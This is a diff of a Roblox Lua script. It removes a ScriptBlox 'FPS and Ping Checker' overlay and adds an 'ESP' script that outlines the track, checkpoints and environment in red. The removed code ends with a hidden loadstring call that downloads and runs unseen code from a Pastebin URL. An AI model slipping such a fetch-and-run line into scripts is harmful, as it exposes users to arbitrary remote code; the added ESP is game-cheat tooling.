@@ -1,99 +1,83 @@
---[[
-	WARNING: Heads up! This script has not been verified by ScriptBlox. Use at your own risk!
-]]
--- FPS and Ping Checker Script (Improved UI with Movable Frame)
+-- Auto‑refreshing ESP Outline for Track, Checkpoints, Lobby[140] and Environment
+-- Run this script ONCE (e.g., in a ServerScript or LocalScript inside StarterPlayerScripts)
 
--- Create a ScreenGui to display FPS and Ping
-local ScreenGui = Instance.new("ScreenGui")
-ScreenGui.Name = "PerformanceGui"
-ScreenGui.ResetOnSpawn = false -- Keep the UI persistent across respawns
-ScreenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
+local ROOT_INSTANCES = {
+	workspace.Lobby:GetChildren()[140],   -- be careful: index 140 must exist
+	workspace.Track,
+	workspace.Track.Checkpoint0,
+	workspace.Track.Checkpoint1,
+	workspace.Track.Checkpoint2,
+	workspace.Track.Checkpoint3,
+	workspace.Track.Checkpoint4,
+	workspace.Track.Checkpoint5,
+	workspace.Track.Checkpoint6,
+	workspace.Track.Checkpoint7,
+	workspace.Track.Checkpoint8,
+	workspace.Track.Checkpoint9,
+	workspace.Track.Checkpoint10,
+	workspace.Track.Checkpoint11,
+	workspace.Track.Checkpoint12,
+	workspace.Track.Checkpoint13,
+	workspace.Track.Checkpoint14,
+	workspace.Track.Checkpoint15,
+	workspace.Track.Checkpoint16,
+	workspace.Track.Checkpoint17,
+	workspace.Track.Checkpoint18,
+	workspace.Track.Checkpoint19,
+	workspace.Track.Checkpoint20,
+	workspace.Track.Checkpoint21,
+	workspace.Track.Checkpoint22,
+	workspace.Track.Checkpoint23,
+	workspace.Track.Checkpoint24,
+	workspace.Track.Checkpoint25,
+	workspace.Track.Checkpoint26,
+	workspace.Track.Checkpoint27,
+	workspace.Track.Checkpoint28,
+	workspace.Track.Checkpoint29,
+	workspace.Track.Checkpoint30,
+	workspace.Track.Checkpoint31,
+	workspace.Track.Checkpoint32,
+	workspace.Track.Environment,
+}
 
--- Frame for FPS and Ping display
-local displayFrame = Instance.new("Frame")
-displayFrame.Size = UDim2.new(0, 250, 0, 100)
-displayFrame.Position = UDim2.new(0, 10, 0, 10)
-displayFrame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
-displayFrame.BackgroundTransparency = 0.4
-displayFrame.BorderSizePixel = 0
-displayFrame.Active = true -- Make the frame active for input events
-displayFrame.Draggable = true -- Enable draggable frame
-displayFrame.Parent = ScreenGui
+local OUTLINE_COLOR = Color3.fromRGB(255, 50, 50)   -- bright red
 
--- FPS Label
-local fpsLabel = Instance.new("TextLabel")
-fpsLabel.Size = UDim2.new(1, -20, 0, 40)
-fpsLabel.Position = UDim2.new(0, 10, 0, 10)
-fpsLabel.TextColor3 = Color3.new(1, 1, 1)
-fpsLabel.TextStrokeTransparency = 0.7
-fpsLabel.TextSize = 24
-fpsLabel.Font = Enum.Font.SourceSansBold
-fpsLabel.TextXAlignment = Enum.TextXAlignment.Left
-fpsLabel.BackgroundTransparency = 1
-fpsLabel.Text = "FPS: Loading..."
-fpsLabel.Parent = displayFrame
-
--- Ping Label
-local pingLabel = Instance.new("TextLabel")
-pingLabel.Size = UDim2.new(1, -20, 0, 40)
-pingLabel.Position = UDim2.new(0, 10, 0, 50)
-pingLabel.TextColor3 = Color3.new(1, 1, 1)
-pingLabel.TextStrokeTransparency = 0.7
-pingLabel.TextSize = 24
-pingLabel.Font = Enum.Font.SourceSansBold
-pingLabel.TextXAlignment = Enum.TextXAlignment.Left
-pingLabel.BackgroundTransparency = 1
-pingLabel.Text = "Ping: Loading..."
-pingLabel.Parent = displayFrame
-
--- FPS Checker
-local fps = 0
-local lastTime = tick()
-
-game:GetService("RunService").RenderStepped:Connect(function()
-    fps = math.floor(1 / (tick() - lastTime))
-    lastTime = tick()
-    fpsLabel.Text = "FPS: " .. tostring(fps)
-end)
-
--- Ping Checker
-local function getPing()
-    local player = game.Players.LocalPlayer
-    local ping = player:GetNetworkPing() * 1000 -- Convert to milliseconds
-    return math.floor(ping)
+-- Helper: adds a Highlight to an instance if it doesn't already have one
+local function addHighlight(instance)
+	if instance:IsA("BasePart") or instance:IsA("Model") then
+		if not instance:FindFirstChildWhichIsA("Highlight") then
+			local hl = Instance.new("Highlight")
+			hl.FillTransparency = 1
+			hl.OutlineTransparency = 0
+			hl.OutlineColor = OUTLINE_COLOR
+			hl.Parent = instance
+		end
+	end
 end
 
-game:GetService("RunService").Stepped:Connect(function()
-    local ping = getPing()
-    pingLabel.Text = "Ping: " .. tostring(ping) .. " ms"
-end)
-
--- Optional: Auto-adjust label colors based on performance
-game:GetService("RunService").Stepped:Connect(function()
-    if fps < 30 then
-        fpsLabel.TextColor3 = Color3.new(1, 0, 0) -- Red for low FPS
-    else
-        fpsLabel.TextColor3 = Color3.new(0, 1, 0) -- Green for good FPS
-    end
-
-    if getPing() > 200 then
-        pingLabel.TextColor3 = Color3.new(1, 0, 0) -- Red for high ping
-    else
-        pingLabel.TextColor3 = Color3.new(0, 1, 0) -- Green for good ping
-    end
-end)
-
--- Optional: Saving frame position locally
-local function savePosition()
-    local pos = displayFrame.Position
-    -- Save the position to a datastore or local storage (optional implementation)
+-- Recursively outline all existing parts/models inside a given root
+local function outlineAllDescendants(root)
+	if not root then return end
+	addHighlight(root)   -- outline the root itself if it's a part/model
+	for _, child in ipairs(root:GetDescendants()) do
+		addHighlight(child)
+	end
 end
 
--- Saving the position when dragging stops
-displayFrame.MouseLeave:Connect(savePosition)
-displayFrame.InputEnded:Connect(function(input)
-    if input.UserInputType == Enum.UserInputType.MouseButton1 then
-        savePosition()
-    end
-end)
-loadstring(game:HttpGet("https://pastebin.com/raw/KiSYpej6",true))()
+-- Watch for new objects appearing anywhere under a root and outline them
+local function watchForNewObjects(root)
+	if not root then return end
+	root.DescendantAdded:Connect(function(descendant)
+		addHighlight(descendant)
+	end)
+end
+
+-- Apply to all root instances
+for _, root in ipairs(ROOT_INSTANCES) do
+	if root then
+		outlineAllDescendants(root)   -- initial outline
+		watchForNewObjects(root)      -- auto‑refresh on new parts/models
+	end
+end
+
+print("Auto‑refreshing ESP outlines enabled for all tracked containers.")
